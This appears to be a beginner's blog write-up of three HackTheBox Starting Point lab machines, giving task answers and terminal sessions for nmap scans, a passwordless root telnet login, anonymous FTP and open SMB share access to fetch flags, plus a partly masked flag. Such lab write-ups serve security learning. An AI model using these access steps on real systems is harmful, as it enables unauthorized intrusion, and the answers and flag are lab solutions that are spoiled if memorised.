This Blog post contain all Tier 0 HackTheBox Starting point all **free** machines. It will be **Meow ,Fawn ,Dancing**. First of all you need to download openvpn file for starting point.

# Meow - Linux

![](Images/meow.jpg)

## Task 1
* What does the acronym VM stand for? **Virtual machine**

##  Task 2
* What tool do we use to interact with the operating system in order to start our VPN connection? **Terminal**

##  Task 3
* What service do we use to form our VPN connection? **Openvpn**

##  Task 4
* What is the abreviated name for a tunnel interface in the output of your VPN boot-up sequence output? **Tun**

##  Task 5
* What tool do we use to test our connection to the target? **Ping**

##  Task 6
* What is the name of the tool we use to scan the target's ports? **Nmap**

##  Task 7
* What service do we identify on port 23/tcp during our scans? **Telenet**

```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /tier 0]
└─$ nmap -sC -sV 10.129.244.123 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 00:32 PDT
Nmap scan report for 10.129.244.123
Host is up (0.18s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.40 seconds
```
## Task 8
* What username ultimately works with the remote management login prompt for the target? **root**

##  Submit Flag

* Submit root flag 
```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /tier 0]
└─$ telnet 10.129.244.123                                                                                                                                                                 1 ⨯
Trying 10.129.244.123...
Connected to 10.129.244.123.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

Last login: Fri Apr  8 07:39:36 UTC 2022 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c***************
```

# Fawn - Linux

![](Images/fawn.jpg)

## Task 1
* What does the 3-letter acronym FTP stand for? **File Transfer Protocol**

## Task 2
* What communication model does FTP use, architecturally speaking? **client-server model**

##  Task 3
* What is the name of one popular GUI FTP program? **Filezilla**

## Task 4
* Which port is the FTP service active on usually? **21 tcp**

```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /tier 0]
└─$ nmap -sC -sV 10.129.104.223 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 00:50 PDT
Nmap scan report for 10.129.104.223
Host is up (0.18s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.49
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.99 seconds
``` 

##  Task 5
* What acronym is used for the secure version of FTP? **SFTP (secure file transfer protocol)**

##  Task 6
* What is the command we can use to test our connection to the target? **Ping**

##  Task 7
* From your scans, what version is FTP running on the target? **vsftpd 3.0.3**

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```
##  Task 8
* From your scans, what OS type is running on the target? Unix
```bash
Service Info: OS: **Unix**
```
##  Submit Flag
Submit root flag 
```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /tier 1]
└─$ ftp 10.129.104.223
Connected to 10.129.104.223.
220 (vsFTPd 3.0.3)
Name (10.129.104.223:defalt): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||8784|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||26404|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************************************************************************************************************|    32       14.95 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.17 KiB/s)
ftp> exit
221 Goodbye.
```

# Dancing - Windows
![](Images/dancing.jpg)
## Task 1

* What does the 3-letter acronym SMB stand for? **Server Message Block**

## Task 2

* What port does SMB use to operate at? **445**

## Task 3

* What network communication model does SMB use, architecturally speaking? **client-server model** 

## Task 4

* What is the service name for port 445 that came up in our nmap scan? **microsoft-ds**
```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /Tier 0]
└─$ nmap -sC -sV 10.129.1.12   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 02:29 PDT
Nmap scan report for 10.129.1.12
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-10T13:29:47
|_  start_date: N/A
|_clock-skew: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.33 seconds
```
## Task 5

* What is the tool we use to connect to SMB shares from our Linux distribution? **smbclient**

## Task 6

* What is the `flag` or `switch` we can use with the SMB tool to `list` the contents of the share? **-L**

```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /Tier 0]
└─$ smbclient -h   
Usage: smbclient [-?EgqBVNkPeC] [-?|--help] [--usage] [-R|--name-resolve=NAME-RESOLVE-ORDER] [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST]
        [-m|--max-protocol=LEVEL] [-T|--tar=<c|x>IXFvgbNan] [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT]
        [-g|--grepable] [-q|--quiet] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [-s|--configfile=CONFIGFILE] [-l|--log-basename=LOGFILEBASE] [-V|--version] [--option=name=value]
        [-O|--socket-options=SOCKETOPTIONS] [-n|--netbiosname=NETBIOSNAME] [-W|--workgroup=WORKGROUP] [-i|--scope=SCOPE] [-U|--user=USERNAME] [-N|--no-pass] [-k|--kerberos]
        [-A|--authentication-file=FILE] [-S|--signing=on|off|required] [-P|--machine-pass] [-e|--encrypt] [-C|--use-ccache] [--pw-nt-hash] service <password>
```

## Task 7

* What is the name of the share we are able to access in the end? **workshares**

## Task 8

* What is the command we can use within the SMB shell to download the files we find? **get**

```bash
┌──(defalt@kali)-[~/Documents/htb/starting point /Tier 0]
└─$ smbclient \\\\10.129.1.12\\WorkShares                                                                                                                                                 1 ⨯
Enter WORKGROUP\defalt's password: 
Try "help" to get a list of possible commands.           
smb: \> help get
HELP get:
    <remote name> [local name] get a file
```

 
## Submit Flag

* Submit root flag

```bash
smb: \> ls
  .                                   D        0  Mon Mar 29 01:22:01 2021
  ..                                  D        0  Mon Mar 29 01:22:01 2021
  Amy.J                               D        0  Mon Mar 29 02:08:24 2021
  James.P                             D        0  Thu Jun  3 01:38:03 2021

        5114111 blocks of size 4096. 1748443 blocks available
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 01:38:03 2021
  ..                                  D        0  Thu Jun  3 01:38:03 2021
  flag.txt                            A       32  Mon Mar 29 02:26:57 2021

        5114111 blocks of size 4096. 1752177 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
Thx for reading !! Have a nice day


